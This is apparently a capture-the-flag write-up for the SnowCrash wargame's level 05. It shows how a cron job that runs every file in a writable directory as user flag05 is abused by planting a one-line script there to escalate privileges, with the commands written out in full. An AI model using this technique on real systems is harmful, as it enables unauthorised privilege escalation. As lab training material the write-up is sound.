# LEVEL 05

Once logged as level05, a message is telling that we have an mail.
> You have new mail.

with the help of the command `find / -name mail 2>/dev/null` we can see a folder "mail" that contains a file "level05"

```
level05@SnowCrash:~$ find / -name mail 2>/dev/null
/usr/lib/byobu/mail
/var/mail
/var/spool/mail
/rofs/usr/lib/byobu/mail
/rofs/var/mail
/rofs/var/spool/mail

level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
The most interesting here is the level05 file, obviously.

It seems to contains an asynchronous job. so after somes research there is a package in Linux that works with cron jobs named `cron` and `crontab`

```
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  *  user command to be executed
```

```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

looking at the script, 
it is running a loop that execute a bash /opt/openarenaserver/file.sh, then remove them

so if we put a script inside /opt/openarenaserver/ it will be executed with flag05 perms, here is the elevating privilege vulnerability
```
level05@SnowCrash:~$ echo 'getflag > /tmp/flag.txt' > /opt/openarenaserver/getmyflag.sh
```
then after waiting less than 2minutes

```
level05@SnowCrash:~$ cat /tmp/flag.txt
Check flag.Here is your token : xxxxxxxxxxxxxxxxxxxxxxx
```